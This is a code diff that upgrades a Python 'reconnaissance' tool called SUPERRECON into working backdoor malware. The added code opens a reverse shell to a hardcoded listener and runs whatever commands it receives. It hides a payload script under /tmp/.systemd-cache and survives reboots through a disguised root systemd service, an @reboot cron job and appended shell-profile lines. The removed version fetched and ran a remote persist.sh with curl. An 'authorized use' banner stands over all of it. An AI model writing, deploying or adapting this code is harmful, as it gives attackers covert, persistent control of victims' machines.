@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-🔥 SUPERECON - ULTIMATE RECON TOOL v2.1
-Advanced Reconnaissance with Auto-Persistence
+🔥 SUPERRECON - PERSISTENT RECON TOOL v3.0
+Advanced Reconnaissance with Reboot-Survival Persistence
+For Authorized Security Testing Only
 """
 
 import socket
@@ -18,17 +19,256 @@ import time
 import urllib3
 import subprocess
 import os
+import base64
+import hashlib
 from datetime import datetime
 import re
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+class PersistentBackdoor:
+    def __init__(self):
+        self.LHOST = "192.168.1.167"
+        self.LPORT = 4444
+        self.stealth_dir = "/tmp/.systemd-cache"
+        self.current_dir = os.getcwd()
+        
+    def wait_for_network_after_reboot(self):
+        """Wait for network connectivity after system reboot"""
+        print("[+] Waiting for network after reboot...")
+        for i in range(60):
+            try:
+                socket.create_connection(("8.8.8.8", 53), timeout=10)
+                print("[✅] Network is ready after reboot")
+                return True
+            except:
+                if i % 10 == 0:
+                    print(f"[⏳] Waiting for network... {i}/60 seconds")
+                time.sleep(1)
+        print("[⚠️] Network timeout, continuing anyway...")
+        return True
+    
+    def become_daemon(self):
+        """Run as background daemon"""
+        try:
+            pid = os.fork()
+            if pid > 0:
+                sys.exit(0)
+        except OSError as e:
+            sys.exit(1)
+        
+        os.chdir("/")
+        os.setsid()
+        os.umask(0)
+        
+    def establish_reverse_shell(self):
+        """Establish reverse shell connection"""
+        while True:
+            try:
+                print(f"[🔄] Attempting connection to {self.LHOST}:{self.LPORT}")
+                
+                s = socket.socket()
+                s.settimeout(30)
+                s.connect((self.LHOST, self.LPORT))
+                
+                print("[✅] SUCCESS: Reverse shell connected!")
+                s.send(b"SUPERRECON_PERSISTENT: Shell active!\n")
+                
+                # Main command loop
+                while True:
+                    data = s.recv(1024).decode().strip()
+                    if not data:
+                        continue
+                        
+                    if data.lower() == 'exit':
+                        break
+                    
+                    # Execute command
+                    try:
+                        result = subprocess.run(data, shell=True, capture_output=True, text=True)
+                        output = result.stdout + result.stderr
+                    except Exception as e:
+                        output = f"Error: {str(e)}"
+                    
+                    s.send(output.encode())
+                    
+            except ConnectionRefusedError:
+                print("[❌] Listener offline, retrying in 30s...")
+            except Exception as e:
+                print(f"[❌] Connection error: {e}")
+            
+            time.sleep(30)
+
+    def deploy_systemd_persistence(self):
+        """Deploy systemd service for reboot survival"""
+        try:
+            # Create stealth directory
+            os.makedirs(self.stealth_dir, exist_ok=True)
+            
+            # Create persistent backdoor script
+            backdoor_script = f'''#!/usr/bin/env python3
+import socket, subprocess, os, time, sys
+
+LHOST = "{self.LHOST}"
+LPORT = {self.LPORT}
+
+def wait_network():
+    for i in range(60):
+        try:
+            socket.create_connection(("8.8.8.8", 53), timeout=10)
+            return True
+        except: time.sleep(1)
+    return True
+
+def reverse_shell():
+    while True:
+        try:
+            s = socket.socket()
+            s.settimeout(30)
+            s.connect((LHOST, LPORT))
+            s.send(b"REBOOT_SURVIVED: System back online!\\\\n")
+            
+            while True:
+                data = s.recv(1024).decode().strip()
+                if not data: continue
+                if data == 'exit': break
+                try:
+                    result = subprocess.run(data, shell=True, capture_output=True, text=True)
+                    output = result.stdout + result.stderr
+                    s.send(output.encode())
+                except: pass
+        except: time.sleep(30)
+
+if __name__ == "__main__":
+    wait_network()
+    reverse_shell()
+'''
+            
+            # Save backdoor script
+            backdoor_path = f"{self.stealth_dir}/.system_analytics.py"
+            with open(backdoor_path, 'w') as f:
+                f.write(backdoor_script)
+            os.chmod(backdoor_path, 0o755)
+            
+            # Create systemd service
+            service_content = f'''[Unit]
+Description=System Analytics Daemon
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=10
+User=root
+ExecStart=/usr/bin/python3 {backdoor_path}
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+'''
+            
+            service_path = "/etc/systemd/system/system-analytics.service"
+            with open(service_path, 'w') as f:
+                f.write(service_content)
+            
+            # Enable and start service
+            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
+            subprocess.run(["systemctl", "enable", "system-analytics.service"], capture_output=True)
+            subprocess.run(["systemctl", "start", "system-analytics.service"], capture_output=True)
+            
+            print("[✅] Systemd persistence deployed")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Systemd persistence failed: {e}")
+            return False
+
+    def deploy_cron_persistence(self):
+        """Deploy cron job for redundancy"""
+        try:
+            cron_command = f"@reboot /usr/bin/python3 {self.stealth_dir}/.system_analytics.py > /dev/null 2>&1"
+            
+            # Get current crontab
+            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+            current_cron = result.stdout if result.returncode == 0 else ""
+            
+            # Add if not present
+            if "system_analytics.py" not in current_cron:
+                new_cron = current_cron + cron_command + "\n"
+                subprocess.run(["crontab", "-"], input=new_cron, text=True)
+                print("[✅] Cron persistence deployed")
+            return True
+        except Exception as e:
+            print(f"[-] Cron persistence failed: {e}")
+            return False
+
+    def deploy_profile_persistence(self):
+        """Deploy shell profile persistence"""
+        try:
+            profile_command = f'nohup python3 {self.stealth_dir}/.system_analytics.py &'
+            profile_files = ["/etc/profile", "/root/.bashrc"]
+            
+            for profile in profile_files:
+                if os.path.exists(profile):
+                    with open(profile, 'a') as f:
+                        f.write(f"\n{profile_command}\n")
+            print("[✅] Profile persistence deployed")
+            return True
+        except Exception as e:
+            print(f"[-] Profile persistence failed: {e}")
+            return False
+
+    def start_immediate_shell(self):
+        """Start immediate reverse shell in background"""
+        try:
+            # Start in background
+            subprocess.Popen([
+                '/usr/bin/python3', '-c', 
+                f'import socket,subprocess,os,time;'
+                f's=socket.socket();s.settimeout(30);'
+                f's.connect(("{self.LHOST}",{self.LPORT}));'
+                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
+                f'subprocess.call(["/bin/bash","-i"])'
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print("[✅] Immediate reverse shell started")
+            return True
+        except Exception as e:
+            print(f"[-] Immediate shell failed: {e}")
+            return False
+
+    def deploy_all_persistence(self):
+        """Deploy all persistence mechanisms"""
+        print(f"\n[🔧] DEPLOYING PERSISTENCE TO {self.LHOST}:{self.LPORT}")
+        
+        # Start immediate connection
+        self.start_immediate_shell()
+        
+        # Deploy persistence mechanisms
+        methods = [
+            self.deploy_systemd_persistence,
+            self.deploy_cron_persistence, 
+            self.deploy_profile_persistence
+        ]
+        
+        success_count = 0
+        for method in methods:
+            if method():
+                success_count += 1
+                time.sleep(1)
+        
+        print(f"[✅] Deployed {success_count}/{len(methods)} persistence methods")
+        return success_count > 0
+
 class UltimateReconTool:
-    def __init__(self, target, threads=50, timeout=10):
+    def __init__(self, target, threads=50, timeout=10, enable_persistence=False):
         self.target = target
         self.threads = threads
         self.timeout = timeout
+        self.enable_persistence = enable_persistence
+        self.persistence = PersistentBackdoor()
         self.results = {}
         self.initialize_results()
         
@@ -47,21 +287,24 @@ class UltimateReconTool:
             'vulnerabilities': [],
             'ssl_info': {},
             'directory_enum': [],
-            'osint_data': {}
+            'osint_data': {},
+            'persistence_deployed': False
         }
 
     def banner(self):
         """Display the tool banner"""
         print("""
 ╔════════════════════════════════════════════════════════════════╗
-║              🔥 SUPERECON - ULTIMATE RECON TOOL v2.1           ║  
-║                   All-in-One Reconnaissance                    ║
-║                    With Auto-Persistence                       ║
+║              🔥 SUPERRECON - PERSISTENT RECON v3.0            ║  
+║               Advanced Reconnaissance + Persistence           ║
 ╚════════════════════════════════════════════════════════════════╝
         """)
         print(f"[*] Target: {self.target}")
         print(f"[*] Threads: {self.threads}")
-        print(f"[*] Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"[*] Persistence: {'ENABLED' if self.enable_persistence else 'DISABLED'}")
+        if self.enable_persistence:
+            print(f"[*] Listener: {self.persistence.LHOST}:{self.persistence.LPORT}")
+        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print("="*60)
 
     def get_ip(self):
@@ -193,7 +436,6 @@ class UltimateReconTool:
                     print(f"    Powered By: {powered_by}")
                     self.results['web_technologies']['powered_by'] = powered_by
                 
-                # Check for common frameworks
                 if 'wp-content' in response.text:
                     print("    Framework: WordPress")
                     self.results['web_technologies']['framework'] = 'WordPress'
@@ -202,47 +444,35 @@ class UltimateReconTool:
             except:
                 continue
 
-    def auto_deploy_persistence(self):
-        """Automatically deploy persistence without manual commands"""
-        print(f"\n[🧪] AUTO-DEPLOYING PERSISTENCE...")
+    def deploy_persistence(self):
+        """Deploy persistence mechanisms"""
+        if not self.enable_persistence:
+            return False
+            
+        print(f"\n[🔧] INITIATING PERSISTENCE DEPLOYMENT...")
         
         try:
-            YOUR_IP = "192.168.1.167"
+            success = self.persistence.deploy_all_persistence()
+            self.results['persistence_deployed'] = success
+            self.results['listener_ip'] = self.persistence.LHOST
+            self.results['listener_port'] = self.persistence.LPORT
             
-            # Create the deployment script
-            deploy_script = f'''#!/bin/bash
-echo "[+] Starting auto-deployment from superecon..."
-cd /tmp
-curl -s "https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules/persist.sh" -o persist.sh || wget -q "https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules/persist.sh" -O persist.sh
-chmod +x persist.sh
-./persist.sh &
-echo "[+] Auto-deployment completed"
-'''
-            
-            # Write and execute the script
-            with open('/tmp/auto_deploy.sh', 'w') as f:
-                f.write(deploy_script)
-            
-            os.chmod('/tmp/auto_deploy.sh', 0o755)
-            
-            # Execute in background without blocking
-            subprocess.Popen(['/bin/bash', '/tmp/auto_deploy.sh'], 
-                           stdout=subprocess.DEVNULL, 
-                           stderr=subprocess.DEVNULL,
-                           stdin=subprocess.DEVNULL)
-            
-            print("[+] Persistence deployment started in background")
-            print("[+] Reverse shell will auto-connect and survive reboots")
-            return True
+            if success:
+                print("[✅] Persistence deployed successfully")
+                print("[🔮] Backdoor will survive reboots via:")
+                print("     - Systemd service (system-analytics.service)")
+                print("     - Cron job (@reboot)")
+                print("     - Shell profile persistence")
+            return success
             
         except Exception as e:
-            print(f"[-] Auto-deployment failed: {e}")
+            print(f"[-] Persistence deployment failed: {e}")
             return False
 
     def generate_report(self, output_file=None):
         """Generate reconnaissance report"""
         if not output_file:
-            output_file = f"recon_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            output_file = f"superrecon_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         
         print(f"\n[+] Generating report: {output_file}")
         with open(output_file, 'w') as f:
@@ -254,24 +484,27 @@ echo "[+] Auto-deployment completed"
     def print_summary(self):
         """Print scan summary"""
         print("\n" + "="*60)
-        print("📊 RECONNAISSANCE SUMMARY")
+        print("📊 SUPERRECON SUMMARY")
         print("="*60)
         print(f"Target: {self.target}")
         print(f"IP Address: {self.results['ip_address']}")
         print(f"Subdomains Found: {len(self.results['subdomains'])}")
         print(f"Open Ports: {len(self.results['open_ports'])}")
-        print(f"Web Server: {self.results['web_technologies'].get('server', 'Not detected')}")
-        print("\n[🎯] Persistence auto-deployed in background")
-        print("[🎯] Reverse shell will survive reboots")
+        
+        if self.enable_persistence and self.results.get('persistence_deployed'):
+            print(f"Persistence: ACTIVE → {self.persistence.LHOST}:{self.persistence.LPORT}")
+            print("🔮 Backdoor will auto-reconnect after reboot")
+        else:
+            print("Persistence: DISABLED")
 
     def run_full_scan(self):
-        """Execute full reconnaissance scan with auto-persistence"""
+        """Execute full reconnaissance scan"""
         start_time = time.time()
         
         try:
             self.banner()
             
-            # Execute reconnaissance methods
+            # Execute reconnaissance
             ip = self.get_ip()
             self.whois_lookup()
             self.dns_enumeration()
@@ -279,11 +512,12 @@ echo "[+] Auto-deployment completed"
             self.port_scanning(ip)
             self.web_technology_detection()
             
-            # Auto-deploy persistence after scan
-            self.auto_deploy_persistence()
+            # Deploy persistence if enabled
+            if self.enable_persistence:
+                self.deploy_persistence()
             
             elapsed_time = time.time() - start_time
-            print(f"\n[+] Advanced scan completed in {elapsed_time:.2f} seconds")
+            print(f"\n[✅] Scan completed in {elapsed_time:.2f} seconds")
             return self.results
             
         except KeyboardInterrupt:
@@ -294,21 +528,27 @@ echo "[+] Auto-deployment completed"
             return self.results
 
 def main():
-    parser = argparse.ArgumentParser(description="🔥 ULTIMATE RECON TOOL v2.1")
+    parser = argparse.ArgumentParser(description="🔥 SUPERRECON v3.0 - Persistent Reconnaissance")
     parser.add_argument("target", help="Target domain or IP address")
     parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
     parser.add_argument("-o", "--output", help="Output file for report")
+    parser.add_argument("-p", "--persistence", action="store_true", 
+                       help="Enable persistence module (requires root)")
     
     args = parser.parse_args()
     
-    print("⚠️  LEGAL DISCLAIMER: For authorized testing only.\n")
-    consent = input("Do you have permission to scan this target? (y/N): ")
-    if consent.lower() not in ['y', 'yes']:
-        print("Scan aborted.")
-        sys.exit(1)
+    print("""
+⚠️  AUTHORIZED USE ONLY
+This tool is for authorized security testing only.
+Ensure you have explicit permission before use.
+    """)
     
-    # Run the recon tool
-    tool = UltimateReconTool(args.target, threads=args.threads)
+    if args.persistence and os.geteuid() != 0:
+        print("[-] Persistence requires root privileges")
+        args.persistence = False
+    
+    # Run the tool
+    tool = UltimateReconTool(args.target, threads=args.threads, enable_persistence=args.persistence)
     results = tool.run_full_scan()
     
     if results:
